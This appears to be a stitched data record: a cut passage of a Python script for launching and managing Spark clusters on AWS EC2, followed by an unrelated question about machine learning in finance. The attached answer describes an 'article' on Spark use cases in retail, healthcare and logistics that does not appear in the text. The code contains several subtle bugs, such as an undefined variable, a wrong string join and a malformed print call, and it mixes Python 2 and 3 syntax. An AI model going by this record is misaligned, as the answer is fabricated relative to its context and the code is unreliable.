~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys)\n    \"\"\"\n    ssh(master.private_dns_name, opts, key_setup)\n    dot_ssh_tar = ssh_read(master.private_dns_name, opts, ['tar', 'c', '.ssh'])\n    print(\"Transferring cluster's SSH key to slaves...\", file=sys.stderr)\n    for slave in slave_nodes:\n      slave.update()\n      ssh_write(slave.private_dns_name, opts, ['tar', 'x'], dot_ssh_tar)\n\n\n  modules = ['mysql','spark', 'ephemeral-hdfs', 'persistent-hdfs',\n            'mapreduce','spark-standalone']\n\n  if opts.hadoop_major_version == \"1\":\n    modules = filter(lambda x: x!= \"mapreduce\", modules)\n\n  if opts.ganglia:\n    modules.append('ganglia')\n\n  ssh(\n    host=master.private_dns_name,\n    opts=opts,\n    command=\"rm -rf spark-ec2\"\n    + \" && \"\n    + \"git clone {r} -b {b} spark-ec2\".format(r=DEFAULT_SPARK_EC2_GITHUB_REPO, b=DEFAULT_SPARK_EC2_BRANCH)\n\n  )\n\n  print(\"Deploying files to master... \", file=sys.stderr)\n  (path, name) = os.path.split(__file__)\n  deploy_files(conn, path+\"/deploy.generic\", opts, master_nodes, slave_nodes, modules)\n\n  print(\"Running setup on master... \", file=sys.stderr)\n  setup_spark_cluster(master, opts)\n  get_master_setup_files(master.private_dns_name, opts)\n  print( stderr,\"Done!\", file=sys.stderr)\n\ndef get_master_setup_files(master, opts):\n  scp(master, opts, \"/root/spark/jars/datanucleus*.jar\", \"%s/lib\" % SPARK_EC2_DIR)\n  scp(master, opts, \"/root/spark/conf/*\", \"%s/conf\" % SPARK_EC2_DIR)\n\ndef setup_spark_cluster(master, opts):\n  ssh(master.private_dns_name, opts, \"chmod u+x spark-ec2/setup.sh\")\n  ssh(master.private_dns_name, opts, \"spark-ec2/setup.sh\")\n  master.update()\n  print(\"Spark standalone cluster started at http://%s:8080\" % master.public_dns_name)\n  print(\"Spark standalone cluster started at http://%s:8080\" % master.public_dns_name, file=sys.stderr)\n  if opts.ganglia:\n    print(\"Ganglia started at http://%s:5080/ganglia\" % master.public_dns_name, file=sys.stderr)\n\n\n\ndef wait_for_cluster(conn, wait_secs, master_nodes, slave_nodes):\n  print(\"Waiting for instances to start up...\", file=sys.stderr)\n  time.sleep(5)\n  wait_for_instances(conn, master_nodes)\n  wait_for_instances(conn, slave_nodes)\n\n\ndef wait_for_cluster_state(conn, opts, cluster_instances, cluster_state):\n  \"\"\"\n  Wait for all the instances in the cluster to reach a designated state.\n\n  cluster_instances: a list of boto.ec2.instance.Instance\n  cluster_state: a string representing the desired state of all the instances in the cluster\n         value can be'ssh-ready' or a valid value from boto.ec2.instance.InstanceState such as\n         'running', 'terminated', etc.\n         (would be nice to replace this with a proper enum: http://stackoverflow.com/a/1695250)\n  \"\"\"\n  sys.stdout.write(\n    \"Waiting for cluster to enter '{s}' state.\".format(s=cluster_state)\n  )\n  sys.stdout.flush()\n\n  start_time = datetime.now()\n  num_attempts = 0\n\n  while True:\n\n    for i in cluster_instances:\n      i.update()\n\n    statuses = conn.get_all_instance_status(instance_ids=[i.id for i in cluster_instances])\n\n    if cluster_state =='ssh-ready':\n      if all(i.state == 'running' for i in cluster_instances) and \\\n              all(s.system_status.status == 'ok' for s in statuses) and \\\n              all(s.instance_status.status == 'ok' for s in statuses) and \\\n              is_cluster_ssh_available(cluster_instances, opts):\n        break\n    else:\n      if all(i.state == cluster_state for i in cluster_instances):\n        break\n\n    num_attempts += 1\n\n    sys.stdout.write(\".\")\n    sys.stdout.flush()\n\n  sys.stdout.write(\"\\n\")\n\n  end_time = datetime.now()\n  print(\"Cluster is now in '{s}' state. Waited {t} seconds.\".format(\n    s=cluster_state,\n    t=(end_time - start_time).seconds\n  ))\n\ndef is_cluster_ssh_available(cluster_instances, opts):\n    \"\"\"\n    Check if SSH is available on all the instances in a cluster.\n    \"\"\"\n    for i in cluster_instances:\n        dns_name = i.private_dns_name\n        if not is_ssh_available(host=dns_name, opts=opts):\n            return False\n    else:\n        return True\n\ndef is_ssh_available(host, opts, print_ssh_output=True):\n    \"\"\"\n    Check if SSH is available on a host.\n    \"\"\"\n    s = subprocess.Popen(\n        ssh_command(opts) + ['-t', '-t', '-o', 'ConnectTimeout=3',\n                             '%s@%s' % (opts.user, host), stringify_command('true')],\n        stdout=subprocess.PIPE,\n    )\n\n    if s.returncode!= 0 and print_ssh_output:\n        print(textwrap.dedent(\"\"\"\\n\n            Warning: SSH connection error. (This could be temporary.)\n            Host: {h}\n            SSH return code: {r}\n            SSH output: {o}\n        \"\"\").format(\n            h=host,\n            r=s.returncode,\n            o=cmd_output.strip()\n        ))\n\n    return s.returncode == 0\n\ndef get_num_disks(instance_type):\n  disks_by_instance = {\n    \"c1.medium\":   1,\n    \"c1.xlarge\":   4,\n    \"c3.large\":    2,\n    \"c3.xlarge\":   2,\n    \"c3.2xlarge\":  2,\n    \"c3.4xlarge\":  2,\n    \"c3.8xlarge\":  2,\n    \"c4.large\":    0,\n    \"c4.xlarge\":   0,\n    \"c4.2xlarge\":  0,\n    \"c4.4xlarge\":  0,\n    \"c4.8xlarge\":  0,\n    \"cc1.4xlarge\": 2,\n    \"cc2.8xlarge\": 4,\n    \"cg1.4xlarge\": 2,\n    \"cr1.8xlarge\": 2,\n    \"d2.xlarge\":   3,\n    \"d2.2xlarge\":  6,\n    \"d2.4xlarge\":  12,\n    \"d2.8xlarge\":  24,\n    \"g2.2xlarge\":  1,\n    \"g2.8xlarge\":  2,\n    \"hi1.4xlarge\": 2,\n    \"hs1.8xlarge\": 24,\n    \"i2.xlarge\":   1,\n    \"i2.2xlarge\":  2,\n    \"i2.4xlarge\":  4,\n    \"i2.8xlarge\":  8,\n    \"m1.small\":    1,\n    \"m1.medium\":   1,\n    \"m1.large\":    2,\n    \"m1.xlarge\":   4,\n    \"m2.xlarge\":   1,\n    \"m2.2xlarge\":  1,\n    \"m2.4xlarge\":  2,\n    \"m3.medium\":   1,\n    \"m3.large\":    1,\n    \"m3.xlarge\":   2,\n    \"m3.2xlarge\":  2,\n    \"r3.large\":    1,\n    \"r3.xlarge\":   1,\n    \"r3.2xlarge\":  1,\n    \"r3.4xlarge\":  1,\n    \"r3.8xlarge\":  2,\n    \"r4.xlarge\":   1,\n    \"r4.2xlarge\":  1,\n    \"r4.4xlarge\":  1,\n    \"r4.8xlarge\":  1,\n    \"r4.16xlarge\": 1,\n    \"x1e.xlarge\":   1,\n    \"x1e.2xlarge\":  1,\n    \"x1e.4xlarge\":  1,\n    \"x1e.8xlarge\":  1,\n    \"x1e.16xlarge\": 1,\n    \"x1e.32xlarge\": 2,\n    \"t1.micro\":    0,\n    \"t2.micro\":    0,\n    \"t2.small\":    0,\n    \"t2.medium\":   0,\n  }\n  if instance_type in disks_by_instance:\n    return disks_by_instance[instance_type]\n  else:\n    print(\"WARNING: Don't know number of disks on instance type %s; assuming 1\"\n          % instance_type, file=stderr)\n    return 1\n\n\ndef deploy_files(conn, root_dir, opts, master_nodes, slave_nodes, modules):\n  active_master = master_nodes[0].private_dns_name\n\n  num_disks = get_num_disks(opts.instance_type)\n  hdfs_data_dirs = \"/mnt/ephemeral-hdfs/data\"\n  mapred_local_dirs = \"/mnt/hadoop/mrlocal\"\n  spark_local_dirs = \"/mnt/spark\"\n  if num_disks > 1:\n    for i in range(2, num_disks + 1):\n      hdfs_data_dirs += \",/mnt%d/ephemeral-hdfs/data\" % i\n      mapred_local_dirs += \",/mnt%d/hadoop/mrlocal\" % i\n      spark_local_dirs += \",/mnt%d/spark\" % i\n\n  cluster_url = \"%s:7077\" % active_master\n\n  if \".\" in opts.spark_version:\n    # Pre-built Spark deploy\n    spark_v = get_validate_spark_version(opts.spark_version, DEFAULT_SPARK_GITHUB_REPO)\n    tachyon_v = get_tachyon_version(spark_v)\n  else:\n    spark_v = \"%s|%s\" % (DEFAULT_SPARK_GITHUB_REPO, opts.spark_version)\n    tachyon_v = \"\"\n    print(\"Deploying Spark via git hash; Tachyon won't be set up\")\n    modules = filter(lambda x: x!= \"tachyon\", modules)\n\n  worker_instances_str = \"%d\" % opts.worker_instances if opts.worker_instances else \"\"\n  template_vars = {\n    \"master_list\": '\\n'.join([i.public_dns_name for i in master_nodes]),\n    \"active_master\": active_master,\n    \"slave_list\": '\\n'.join([i.public_dns_name for i in slave_nodes]),\n    \"cluster_url\": cluster_url,\n    \"hdfs_data_dirs\": hdfs_data_dirs,\n    \"mapred_local_dirs\": mapred_local_dirs,\n    \"spark_local_dirs\": spark_local_dirs,\n    \"swap\": str(opts.swap),\n    \"modules\": '\\n'.join(modules),\n    \"spark_version\": spark_v,\n    \"hadoop_major_version\": opts.hadoop_major_version,\n    \"metastore_user\": \"hive\",\n    \"metastore_passwd\": ''.join(random.SystemRandom().choice(string.uppercase + string.digits) for _ in xrange(10)),\n    \"spark_worker_instances\": worker_instances_str,\n    \"spark_master_opts\": opts.master_opts\n  }\n\n  print(root_dir)\n  tmp_dir = tempfile.mkdtemp()\n  for path, dirs, files in os.walk(root_dir):\n    if path.find(\".svn\") == -1:\n      dest_dir = os.path.join('/', path[len(root_dir):])\n      local_dir = tmp_dir + dest_dir\n      if not os.path.exists(local_dir):\n        os.makedirs(local_dir)\n      for filename in files:\n        if filename[0] not in '#.~' and filename[-1]!= '~':\n          dest_file = os.path.join(dest_dir, filename)\n          local_file = tmp_dir + dest_file\n          with open(os.path.join(path, filename)) as src:\n            with open(local_file, \"w\") as dest:\n              text = src.read()\n              for key in template_vars:\n                text = text.replace(\"{{\" + key + \"}}\", template_vars[key])\n              dest.write(text)\n              dest.close()\n  command = [\n      'rsync', '-rv',\n      '-e', stringify_command(ssh_command(opts)),\n      \"%s/\" % tmp_dir,\n      \"%s@%s:/\" % (opts.user, active_master)\n    ]\n  subprocess.check_call(command)\n  shutil.rmtree(tmp_dir)\n  print(tmp_dir)\n\n\ndef stringify_command(parts):\n  if isinstance(parts, str):\n    return parts\n  else:\n    return''.join(map(pipes.quote, parts))\n\n\ndef ssh_args(opts):\n  parts = ['-o', 'StrictHostKeyChecking=no', '-o LogLevel=error']\n  # parts += ['-i', '~/.ssh/id_rsa']\n  return parts\n\n\ndef ssh_command(opts):\n  return ['ssh'] + ssh_args(opts)\n\ndef scp_command(opts):\n  return ['scp'] + ssh_args(opts)\n\ndef pub_key():\n  key_gen = \"\"\"[ -f ~/.ssh/id_rsa ] ||\n        (ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa)\n  \"\"\"\n  subprocess.check_call(key_gen, shell=True)\n  return subprocess.Popen(\"cat ~/.ssh/id_rsa.pub\", shell=True, stdout=subprocess.PIPE).communicate()[0]\n\ndef profile():\n  return subprocess.Popen(\"\"\"curl -s http://169.254.169.254/latest/meta-data/iam/info | grep InstanceProfileArn\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0].split(\"\\\"\")[3]\n\ndef region():\n  return subprocess.Popen(\"\"\"curl -s http://169.254.169.254/latest/dynamic/instance-identity/document | grep region\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0].split(\"\\\"\")[3]\n\ndef zone():\n  return subprocess.Popen(\"\"\"curl -s http://169.254.169.254/latest/dynamic/instance-identity/document | grep availabilityZone\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0].split(\"\\\"\")[3]\n\ndef subnetId():\n  mac = subprocess.Popen(\"\"\"curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/ | grep /\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0].split(\"/\")[0]\n  return subprocess.Popen(\"\"\"curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/\"\"\" + mac + \"\"\"/subnet-id/\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0]\n\ndef keypair():\n    return subprocess.Popen(\"\"\"curl -s  http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0].split(\" \")[2].strip()\n\ndef ssh(host, opts, command):\n  tries = 0\n  while True:\n    try:\n      return subprocess.check_call(\n        ssh_command(opts) + ['-t', '-t', '%s@%s' % (opts.user, host), stringify_command(command)])\n    except subprocess.CalledProcessError as e:\n      if (tries > 25):\n        print('Failed to SSH to remote host %s after %s retries.' % (host, tries), file=sys.stderr)\n        # If this was an ssh failure, provide the user with hints.\n        if e.returncode == 255:\n          raise UsageError('Failed to SSH to remote host %s.\\nPlease check that you have provided the correct --identity-file and --key-pair parameters and try again.' % (host))\n        else:\n          raise e\n      time.sleep(30)\n      tries = tries + 1\n\ndef scp(host, opts, src, target):\n  tries = 0\n  while True:\n    try:\n      return subprocess.check_call(\n        scp_command(opts) + ['%s@%s:%s' % (opts.user, host,src), target])\n    except subprocess.CalledProcessError as e:\n      if (tries > 25):\n        print(\"Failed to SCP to remote host {0} after r retries.\".format(host), file=sys.stderr)\n        # If this was an ssh failure, provide the user with hints.\n        if e.returncode == 255:\n          raise UsageError(\"Failed to SCP to remote host {0}.\\nPlease check that you have provided the correct --identity-file and --key-pair parameters and try again.\".format(host))\n        else:\n          raise e\n      time.sleep(30)\n      tries = tries + 1\n\n\ndef _check_output(*popenargs, **kwargs):\n    if'stdout' in kwargs:\n        raise ValueError('stdout argument not allowed, it will be overridden.')\n    process = subprocess.Popen(stdout=subprocess.PIPE, *popenargs, **kwargs)\n    output, unused_err = process.communicate()\n    retcode = process.poll()\n    if retcode:\n        cmd = kwargs.get(\"args\")\n        if cmd is None:\n            cmd = popenargs[0]\n        raise subprocess.CalledProcessError(retcode, cmd, output=output)\n    return output\n\n\ndef ssh_read(host, opts, command):\n  return _check_output(\n      ssh_command(opts) + ['%s@%s' % (opts.user, host), stringify_command(command)])\n\n\ndef ssh_write(host, opts, command, input):\n  tries = 0\n  while True:\n    proc = subprocess.Popen(\n        ssh_command(opts) + ['%s@%s' % (opts.user, host), stringify_command(command)],\n        stdin=subprocess.PIPE, stderr=subprocess.STDOUT)\n    proc.stdin.write(input)\n    proc.stdin.close()\n    status = proc.wait()\n    if status == 0:\n      break\n    elif (tries > 15):\n      raise RuntimeError(\"ssh_write failed with error %s\" % proc.returncode)\n    else:\n      print(\"Error {0} while executing remote command, retrying after 30 seconds\".format(status), file=sys.stderr)\n      time.sleep(30)\n      tries = tries + 1\n\n\ndef get_zones(conn, opts):\n  if opts.zone == 'all':\n    zones = [z.name for z in conn.get_all_zones()]\n  else:\n    zones = [opts.zone]\n  return zones\n\n\n# Gets the number of items in a partition\ndef get_partition(total, num_partitions, current_partitions):\n  num_slaves_this_zone = total // num_partitions\n  if (total % num_partitions) - current_partitions > 0:\n    num_slaves_this_zone += 1\n  return num_slaves_this_zone\n\n\ndef real_main():\n  (opts, action, cluster_name) = parse_args()\n  get_validate_spark_version(opts.spark_version, DEFAULT_SPARK_GITHUB_REPO)\n  try:\n    conn = ec2.connect_to_region(opts.region)\n  except Exception as e:\n    print(e, file=sys.stderr)\n    sys.exit(1)\n\n  if opts.zone == \"\":\n    opts.zone = random.choice(conn.get_all_zones()).name\n\n  if action == \"launch\":\n    if opts.slaves <= 0:\n      print(\"ERROR: You have to start at least 1 slave\", file=sys.stderr)\n      sys.exit(1)\n    if opts.resume:\n      (master_nodes, slave_nodes) = get_existing_cluster(\n          conn, opts, cluster_name)\n    else:\n      start_secs = time.time()\n      (master_nodes, slave_nodes) = launch_cluster(\n          conn, opts, cluster_name)\n      wait_for_cluster(conn, opts.wait, master_nodes, slave_nodes)\n      print(\"Provisioning took %.3f minutes\" % ((time.time() - start_secs) / 60.0), file=sys.stderr)\n      start_secs = time.time()\n      setup_cluster(conn, master_nodes, slave_nodes, opts, True)\n      print(\"Setup took %.3f minutes\" % ((time.time() - start_secs)/60.0), file=sys.stderr)\n\n  elif action == \"destroy\":\n    (master_nodes, slave_nodes) = get_existing_cluster(\n        conn, opts, cluster_name, die_on_error=False)\n    print(\"Terminating master...\", file=sys.stderr)\n    for inst in master_nodes:\n      inst.terminate()\n    print(\"Terminating slaves...\", file=sys.stderr)\n    for inst in slave_nodes:\n      inst.terminate()\n\n    if opts.delete_groups:\n      print(\"Deleting security groups (this will take some time)...\", file=sys.stderr)\n      group_names = [cluster_name + \"-master\", cluster_name + \"-slaves\"]\n      wait_for_cluster_state(\n          conn=conn,\n          opts=opts,\n          cluster_instances=(master_nodes + slave_nodes),\n          cluster_state='terminated'\n      )\n      attempt = 1;\n      while attempt <= 3:\n        print(\"Attempt %d\" % attempt, file=sys.stderr)\n        groups = [g for g in conn.get_all_security_groups() if g.name in group_names]\n        success = True\n        # Delete individual rules in all groups before deleting groups to\n        for group in groups:\n          print(\"Deleting rules in security group \" + group.name, file=sys.stderr)\n          for rule in group.rules:\n            for grant in rule.grants:\n                success &= group.revoke(ip_protocol=rule.ip_protocol,\n                         from_port=rule.from_port,\n                         to_port=rule.to_port,\n                         src_group=grant)\n\n        time.sleep(30)  # Yes, it does have to be this long :-(\n        for group in groups:\n          try:\n            conn.delete_security_group(group_id=group.id)\n            print(\"Deleted security group %s\" % group.name)\n          except boto.exception.EC2ResponseError:\n            success = False;\n            print(\"Failed to delete security group \" + group.name, file=sys.stderr)\n\n        # Unfortunately, group.revoke() returns True even if a rule was not\n        # deleted, so this needs to be rerun if something fails\n        if success: break;\n\n        attempt += 1\n\n      if not success:\n        print(\"Failed to delete all security groups after 3 tries.\", file=sys.stderr)\n        print (\"Try re-running in a few minutes.\", file=sys.stderr)\n\n  elif action == \"login\":\n    (master_nodes, slave_nodes) = get_existing_cluster(\n        conn, opts, cluster_name)\n    master = master_nodes[0].public_dns_name\n    print(\"Logging into master \" + master + \"...\")\n    proxy_opt = []\n    if opts.proxy_port!= None:\n      proxy_opt = ['-D', opts.proxy_port]\n    subprocess.check_call(\n        ssh_command(opts) + proxy_opt + ['-t', '-t', \"%s@%s\" % (opts.user, master)])\n\n  elif action == \"get-master\":\n    (master_nodes, slave_nodes) = get_existing_cluster(conn, opts, cluster_name)\n    print(master_nodes[0].public_dns_name)\n\n  elif action == \"stop\":\n    response = raw_input(\"Are you sure you want to stop the cluster \" +\n        cluster_name + \"?\\nDATA ON EPHEMERAL DISKS WILL BE LOST, \" +\n        \"BUT THE CLUSTER WILL KEEP USING SPACE ON\\n\" +\n        \"AMAZON EBS IF IT IS EBS-BACKED!!\\n\" +\n        \"All data on spot-instance slaves will be lost.\\n\" +\n        \"Stop cluster \" + cluster_name + \" (y/N): \")\n    if response == \"y\":\n      (master_nodes, slave_nodes) = get_existing_cluster(\n          conn, opts, cluster_name, die_on_error=False)\n      print(\"Stopping master...\", file=sys.stderr)\n      for inst in master_nodes:\n        if inst.state not in [\"shutting-down\", \"terminated\"]:\n          inst.stop()\n      print(\"Stopping slaves...\", file=sys.stderr)\n      for inst in slave_nodes:\n        if inst.state not in [\"shutting-down\", \"terminated\"]:\n          if inst.spot_instance_request_id:\n            inst.terminate()\n          else:\n            inst.stop()\n\n  elif action == \"start\":\n    (master_nodes, slave_nodes) = get_existing_cluster(conn, opts, cluster_name)\n    print(\"Starting slaves...\", file=sys.stderr)\n    for inst in slave_nodes:\n      if inst.state not in [\"shutting-down\", \"terminated\"]:\n        inst.start()\n    print(\"Starting master...\", file=sys.stderr)\n    for inst in master_nodes:\n      if inst.state not in [\"shutting-down\", \"terminated\"]:\n        inst.start()\n    wait_for_cluster(conn, opts.wait, master_nodes, slave_nodes)\n    setup_cluster(conn, master_nodes, slave_nodes, opts, False)\n\n  else:\n    print(\"Invalid action: %s\" % action, file=sys.stderr)\n    sys.exit(1)\n\ndef find_best_price(conn,instance,zone, factor):\n  last_hour_zone = get_spot_price(conn,zone,datetime.utcnow()-timedelta(hours=1),instance)\n  average_price_last_hour = sum(i.price for i in last_hour_zone)/float(len(last_hour_zone))\n  return average_price_last_hour*factor\n\ndef get_spot_price(conn,zone,start_date_hour,instance):\n    return conn.get_spot_price_history(start_time=start_date_hour.strftime(\"%Y-%m-%dT%H:%M:%SZ\"),end_time = datetime.utcnow().strftime(\"%Y-%m-%dT%H:%M:%SZ\"),instance_type=instance, product_description=\"Linux/UNIX\",availability_zone=zone)\n\ndef main():\n  try:\n    real_main()\n  except UsageError, e:\n    print(e, file=sys.stderr)\n    sys.exit(1)\n\n\nif __name__ == \"__main__\":\n  logging.basicConfig()\n  main()", "question": " What are some potential applications of machine learning in finance, according to the article?", "answer": " The article does not specifically mention potential applications of machine learning in finance. It discusses Spark, an open-source big data framework, and its use in Spark-based machine learning applications. It mentions potential use cases in domains like retail, healthcare, and logistics, but does not focus on finance."}
